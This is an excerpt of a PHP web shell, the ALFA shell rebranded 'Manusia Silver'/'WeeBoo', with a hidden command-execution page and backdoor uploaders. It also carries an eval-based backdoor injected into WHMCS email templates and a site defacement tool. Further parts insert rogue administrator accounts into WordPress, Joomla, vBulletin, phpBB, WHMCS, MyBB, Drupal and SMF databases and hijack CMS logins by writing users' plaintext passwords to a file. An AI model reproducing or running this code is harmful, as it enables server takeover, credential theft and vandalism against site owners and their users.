...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => '16185f7aea54fa9bb72e77ba24f82e40',
    'safe_mode' => '1',
    'login_page' => '500',
    'show_icons' => '1',
...
define("__ALFA_VERSION__", "B E T A");
#define("__ALFA_UPDATE__", "2");
define("__ALFA_CODE_NAME__", "< Manusia Silver />");
define("__ALFA_DATA_FOLDER__", "manusiasilver");
...
$GLOBALS['__ALFA_COLOR__'] = array(
		...
		"header_show_all" => "green",
		"disable_functions" => "green",
		"footer_text" => "white",
		"menu_options" => "white",
		...
		"main_size" => "gray",
		"main_modify" => "gray",
		"main_owner_group" => "gray",
		"main_green_perm" => "green",
		"main_red_perm" => "red",
		"main_white_perm" => "white",
		"beetween_perms" => "white",
		"main_actions" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
		...
		"input_box:hover" => array(
			"key_color" => "white",
			"multi_selector" => array(
				"input[type=text]:hover,textarea:hover" => "box-shadow:0 0 1px {color};border:1px solid {color};",
			)
		),
		...
		"select_box:hover" => array(
			"key_color" => "white",
			"multi_selector" => array(
				"select:hover" => "box-shadow:0 0 1px {color};border:1px solid {color};",
			)
		),
		"button_border" => array(
			"key_color" => "green",
		...
		"button:hover" => array(
			"key_color" => "white",
			"multi_selector" => array(
				"input[type=submit]:hover" => "box-shadow:0 0 1px {color};border:1px solid {color};",
				".button:hover,#addup:hover" => "box-shadow:0 0 1px {color};border:1px solid {color};",
			)
		),
		"outputs_text" => array(
			"key_color" => "white",
...
<title>'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.'</title><center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if(isset($_COOKIE["manusiasilver_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["manusiasilver_api"])){
			if(!@file_exists("manusiasilver_api/".$_COOKIE["manusiasilver_api"].".alfa")){
				$recreate = true;
				$lang = $_COOKIE["manusiasilver_api"];
			}
		}
		if(!isset($_COOKIE["manusiasilver_api"])||$recreate){
			...
			alfacgihtaccess('cgi', "manusiasilver_api/");
		}else{
			$lang = $_COOKIE["manusiasilver_api"];
		}
		$cgi_ext = ".alfa";
		...
		$cgi_url = __ALFA_DATA_FOLDER__."/manusiasilver_api/".$lang.$cgi_ext;
		$cmd = "check=W3NvbGV2aXNpYmxlfmFwaV0=&cmd=".__ZW5jb2Rlcg("cd ".$GLOBALS['cwd'].";".$cmd);
		if($is_curl){$address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://").$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
			$post = new AlfaCURL();
		...
		$out = "";
		if(strpos($data, "[WeeBoo~api]") !== false && strpos($data, '[WeeBoo~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("manusiasilver_api", $lang);
			}
			...
			if($set_cookie){
				__alfa_set_cookie("manusiasilver_mode", "off");
			}
		}
		return trim($out);
	}else{
...
if(isset($_GET["WeeBoo"])){
@error_reporting(E_ALL ^ E_NOTICE);
echo '<html>';
echo "<title>WeeBoo Hidden Shell</title>";
...
echo '<hr><form onSubmit="this.execute.disabled=true;this.command_weeboo.value = btoa(unescape(encodeURIComponent(this.command_weeboo.value)));" method="POST">Execute Command: <input name="command_weeboo" value="" size="59" type="text" align="left" ><input name="execute" value="Execute" type="submit"><br></form>
<hr><pre>';
if(isset($_POST['command_weeboo'])){
if(strtolower(substr(PHP_OS,0,3))=="win")$separator='&';else $separator=';';
$WeeBoo = "cd '".addslashes(str_replace("\\","/",@alfaGetCwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_weeboo']);
echo alfaEx($WeeBoo);
}
echo'</pre>
</body></html>';
...
$alfa_uploader = '$x = base64_decode("'.$GLOBALS['__ALFA_SHELL_CODE'].'");$WeeBoo = fopen("WeeBoo.php","w");fwrite($WeeBoo,$x);';
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?WeeBoo"><span style="color:white;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
<div class="header"><table width="100%" border="0">
<tr>
<td width="3%"><span class="header_vars">Server :</span></td>
...
echo '<tr>
<td height="12"><span class="header_vars">Path:</span></td>
...
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('PAHAAAAA CHAN is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>PAHAAAAA CHAN Uploader</option><option value='my'>My Private Shell</option></select>";
...
echo '';
echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['alfa3'])?$GLOBALS['DB_NAME']['user']:$_POST['alfa3']).'" placeholder="WeeBoo"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
if($_POST['alfa5']=='>>'){
echo __pre();
...
$newindex = "<p>Dear $newin,</p><p>Recently a request was submitted to reset yourpassword for our client area. If you did not request this, please ignore this email. It will expire and become useless in 2 hours time.</p><p>To reset your password, please visit the url below:<br /><a href=\"{\$pw_reset_url}\">{\$pw_reset_url}</a></p><p>When you visit the link above, your password will be reset, and the new password will be emailed to you.</p><p>{\$signature}</p>{php}if(\$_COOKIE[\"sec\"] == \"123\"){eval(base64_decode(\$_COOKIE[\"sec2\"])); die(\"!\");}{\/php}";
...
$create = "insert into tblclients (email) values('WeeBoo@fbi.gov')";
...
$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=WeeBoo@fbi.gov");
$backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
$WeeBoo = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
__alert("shell injectet...");
$ff= 'http://'.$path."/WeeBoo.php";
output($ff);}else{
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>WeeBoo@fbi.gov</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/WeeBoo.php' target='_blank'>".$path."/WeeBoo.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
...
if($res){
$ff = 'http://'.$realurl.$realpath."/WeeBoo.php";
output($ff);
}else{
$ff = 'http://'.$realurl.$realpath."/calendar.php";
$fff = 'http://'.$realurl.$realpath."/WeeBoo.php";
...
function alfaWriteTocgiapi($name, $source){
	...
	@mkdir('manusiasilver_api',0755);
	__write_file("manusiasilver_api/".$name, __get_resource($source));
	@chmod("manusiasilver_api/".$name, 0755);
	return $temp;
}
...
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$data = alfaEx("cd '{$tmp_path}/manusiasilver_api';sh getheader.alfa",false,true,true);
...
<tr>
<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><button onClick='alfaOpenPhpTerminal();return false;' class='foottable alfa_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='http://solevisible.com/icons/menu/terminal.svg'> Terminal</button><br></form></td>
</tr>
<tr>
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/manusiasilver_api/getdir.alfa")){
		...
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/manusiasilver_api;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
echo '<div><div class="filters-holder"><span style="color:white;">Filter: </span><input style="color:white;background-color:transparent;border:1px solid green;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="color:white;margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'alfa_sort_by\');" style="color:white;background-color:transparent;"><option value="name" '.($alfa_sort_by == 'name'?'selected':'').'>Name</option><option value="size" '.($alfa_sort_by == 'size'?'selected':'').'>Size</option><option value="modify" '.($alfa_sort_by == 'modify'?'selected':'').'>Modify</option></select><span style="color:white;margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'alfa_filesman_direction\')" style="color:white;background-color:transparent;"><option value="asc" '.($alfa_filesman_direction == 'asc'?'selected':'').'>Ascending</option><option value="desc" '.($alfa_filesman_direction == 'desc'?'selected':'').'>Descending</option></select><span style="color:white;margin-left:10px;"> Limit: </span><input style="text-align:center;width: 40px;color:white;border:1px solid green;background-color:transparent;" type="text" name="limited_number" value="'.$alfa_limited_files.'" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'alfa_limited_files\', this.value, 2012);"><span style="color:white;margin-left:10px;">Files Count: <b style="color:green;">'.($count_dirContent-1).'</b></span></div><div class="header">';
if($dirContent == false){
...
<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
<select id='tools_selector' style='color:white;background-color:transparent;' name='alfa1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete' selected>Delete</option><option value='zip'>Add 2 Compress (zip)</option><option value='unzip'>Add 2 Uncompress (zip)</option><option value='paste'>Paste / Zip / Unzip </option></select>
...
echo '<div class="editor-view"><div class="view-content"><table cellspacing=1 cellpadding=5 bgcolor=black><tr><td bgcolor=white><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table></div></div>';
break;
case 'rename':
@chdir($_POST['c']);
...
'md5 ( $string )' => 'md5($s)',
'sha1 ( $string )' => 'sha1($s)',
'hash ( "sha251", $string ) --> sha251' => 'hash("sha256",$s)','hash ( "sha384", $string ) --> sha384' => 'hash("sha384",$s)',
...
<textarea name=index rows='19' cols='103'><title>Hacked By Penyefonk Puja Paha Nguyen</title><b>Hacked By Penyefonk Puja Paha Nguyen</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
$s0levisible="Powered By WeeBoo";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
$deface = '$x = base64_decode("'.__ZW5jb2Rlcg($index).'"); $WeeBoo = fopen("'.$fname.'","w"); fwrite($WeeBoo,$x);';
...
<title>Hacked By Penyefonk Puja Paha Nguyen</title><b>Hacked By Penyefonk Puja Paha Nguyen</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Penyefonk Puja Paha Nguyen(PAHAAAAA CHAN)");
...
<input type="text" name="defacer" size="67" id="text" placeholder="PAHAAAAA CHAN 2012" />
<br>
...
$table = array('td1' =>
 ...
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'WeeBoo', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'WeeBoo@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$WeeBoo=@mysqli_query($conn,"insert into ".$prefix."users (ID,user_login,user_pass,user_email) values(null,'$admin','d4a590caacc0be55ef286e40a945ea45','$SQL')") or die(mysqli_error($conn));
$WeeBoo=@mysqli_query($conn,"select ID from ".$prefix."users where user_login='".$admin."'") or die(mysqli_error($conn));
$sole = @mysqli_num_rows($WeeBoo);
if ($sole == 1){
$solevis = @mysqli_fetch_assoc($WeeBoo);
$res = $solevis['ID'];
}
$WeeBoo=@mysqli_query($conn,"insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','first_name','WeeBoo'),(null,'".$res."','last_name','WeeBoo'),(null,'".$res."','nickname','WeeBoo'),(null,'".$res."','description','WeeBoo'),(null,'".$res."','rich_editing','true'),(null,'".$res."','comment_shortcuts','false'),(null,'".$res."','admin_color','fresh'),(null,'".$res."','use_ssl','0'),(null,'".$res."','show_admin_bar_front','true'),(null,'".$res."','".$prefix."capabilities','a:1:{s:13:\"administrator\";b:1;}'),(null,'".$res."','".$prefix."user_level','10'),(null,'".$res."','show_welcome_panel','1'),(null,'".$res."','".$prefix."dashboard_quick_press_last_post_id','3')") or die(mysqli_error($conn));
if($WeeBoo){
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'WeeBoo', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'WeeBoo@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$prefix = $_POST['alfa10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$WeeBoo=@mysqli_query($conn,"insert into ".$prefix."users (id,name,username,email,password) values(null,'Super User','".$admin."','".$SQL."','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
$WeeBoo=@mysqli_query($conn,"select id from ".$prefix."users where username='".$admin."'") or die(mysqli_error($conn));
$sole =@mysqli_num_rows($WeeBoo);
if ($sole == 1){
$solevis =@mysqli_fetch_assoc($WeeBoo);
$res = $solevis['id'];
}
$WeeBoo=@mysqli_query($conn,"INSERT INTO ".$prefix."user_usergroup_map (user_id,group_id) VALUES ('".$res."', '8')") or die(mysqli_error($conn));
if($WeeBoo){
__alert('Success... '.$admin.' is created...');}
}
}
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'WeeBoo', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'WeeBoo@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$adm_perm = "16744444";
if($pw_col > 0){
$WeeBoo=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,password,salt,email,passworddate,joindate) values(null,'6','$admin','52e28b78f55641cd4618ad1a20f5fd5c','Xw|IbGLhTQA-AwApVv>61y^(z]*<QN','$SQL','".date('Y-m-d')."','".time()."')") or die(mysqli_error($conn));
}else{
$adm_perm = "2143256444";
$WeeBoo=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,token,secret,email,passworddate,joindate,scheme,birthday_search) values(null,'6','$admin','\$2y\$10\$YsVhV.9tLnzBYxar1BJAGO3vFz68/qDU7Jt62SDdLy6lUT9N5Z/wq','Qf~ADeA}iAey-&#ALQF<}/uBDqSnw>','$SQL','".date('Y-m-d')."','".time()."','blowfish:10','1984-05-20')") or die(mysqli_error($conn));
}
$WeeBoo=@mysqli_query($conn,"select userid from {$prefix}user where username='".$admin."'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($WeeBoo);
if($sole == 1){
$solevis = mysqli_fetch_assoc($WeeBoo);
$res = $solevis['userid'];
}
$WeeBoo=@mysqli_query($conn,"insert into {$prefix}administrator (userid,adminpermissions) values('".$res."','".$adm_perm."')") or die(mysqli_error($conn));
if($WeeBoo){
__alert('Success... '.$admin.' is created...');}
}
}
...
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$hash = md5('WeeBoo');
$WeeBoo=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
$WeeBoo=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
$WeeBoo=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE user_type = 3") or die(mysqli_error($conn));
$WeeBoo=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE user_type = 3") or die(mysqli_error($conn));
$WeeBoo=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_email ='".$SQL."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
if($WeeBoo){
__alert('Success... '.$admin.' is created...');
}
}
...
$SQL = $_POST['alfa9'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$WeeBoo=@mysqli_query($conn,"insert into tbladmins (id,roleid,username,password,email,template,homewidgets) values(null,'1','".$admin."','d4a590caacc0be55ef286e40a945ea45','".$SQL."','blend','getting_started:true,orders_overview:true,supporttickets_overview:true,my_notes:true,client_activity:true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:true,sysinfo:true,admin_activity:true,todo_list:true,network_status:true,income_forecast:true|')") or die(mysqli_error($conn));
if($WeeBoo){
__alert('Success... '.$admin.' is created...');}
}
}
...
$prefix = $_POST['alfa10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$WeeBoo=@mysqli_query($conn,"insert into ".$prefix."users (uid,username,password,salt,email,usergroup) values(null,'".$admin."','e71f2c3265619038d826a1ac6e2b9b8e','ywza68lS','".$SQL."','4')") or die(mysqli_error($conn));
if($WeeBoo){
__alert('Success... '.$admin.' is created...');}
}
}
...
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$hash = md5($pwd);
$WeeBoo=@mysqli_query($conn,"insert into ".$prefix."_authors(aid,name,email,pwd) values('$admin','God','$SQL','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
if($WeeBoo){
__alert('Success... '.$admin.' is created...');}
}
}
...
$WeeBoo=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','WeeBoo@fbi.gov','filtered_html','1','Europe/Berlin','WeeBoo@fbi.gov')") or die(mysqli_error($conn));
$WeeBoo=@mysqli_query($conn,"select uid from users where name='".$admin."'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($WeeBoo);
if ($sole == 1){
$solevis = mysqli_fetch_assoc($WeeBoo);
$res = $solevis['uid'];
}
$WeeBoo=@mysqli_query($conn,"INSERT INTO users_roles (uid,rid) VALUES ('".$res."', '3')") or die(mysqli_error($conn));
if($WeeBoo){
__alert('Success... '.$admin.' is created...');}
}
}
...
$admin = $_POST['alfa8'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$setpwAlg = sha1(strtolower($admin) . 'WeeBoo');
$WeeBoo=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','WeeBoo@fbi.gov')") or die(mysqli_error($conn));
if($WeeBoo){
__alert('Success... '.$admin.' is created...');}
}
}
...
if(isset($_POST['alfa2'])&&($_POST['alfa2']=='symperl'||$_POST["alfa2"]=="sympy")){
	...
	if(strlen($resource) == 0){
		echo AlfaiFrameCreator('cgimanusiasilver/'.$cginame);
	}else{
		echo $resource;
	}
}
...
if($solevisible58){$new_name = str_replace(".", "_", basename($symname));
...
if($sole){
	foreach($sole as $visible){
		if(@strstr($visible,":")){
			$WeeBoo = explode(':', $visible);
			$cwd = str_replace("{user}", trim($WeeBoo[1]), $makepwd);
			echo str_replace(array("{count}","{user}","{url}","{cwd}"), array($count++, trim($WeeBoo[1]), trim($WeeBoo[0]), $cwd), $template);
		}
	}
}else{
...
break;
case 'pgsql':
$this->query("CREATE TABLE WeeBoo(file text);COPY WeeBoo FROM '".addslashes($str)."';select file from WeeBoo;");
$r=array();
while($i=$this->fetch())
$r[] = $i['file'];
$this->query('drop table WeeBoo');
...
@chmod($name,0755);
echo '<iframe src="'.__ALFA_DATA_FOLDER__.'/cgimanusiasilver/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
$bash_users  = alfaEx("cd ".$tmp_path."/manusiasilver_api;sh basedir.alfa ".$makepwd,false,true,true);
...
break;
case "ipb":
hijackIPB($cmspath,$saveto);break;
case "phpbb":
...
$code = '<?php jimport(\'joomla.user.authentication\');$Alfa_auth = & JAuthentication::getInstance();$manusiasilver = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($manusiasilver, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="{saveto_path}";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST[\'passwd\']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
